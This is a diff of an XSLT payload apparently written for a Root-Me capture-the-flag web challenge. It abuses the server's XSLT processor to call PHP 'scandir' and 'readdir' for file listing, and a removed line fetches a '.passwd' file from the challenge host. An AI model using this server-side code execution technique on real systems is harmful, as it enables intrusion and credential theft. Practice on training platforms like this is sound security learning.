@@ -9,10 +9,17 @@
         
     	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
         
-        Dir: <xsl:variable name="assert" select="php:function('scandir', '.')"/>
-             <xsl:value-of select="assert"/>
+        Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+        Files: <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
+        <xsl:value-of select="php:function('readdir')"/>
         
-    	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/Array/.passwd')"/>    
     </p>
 </body>
 </html> 
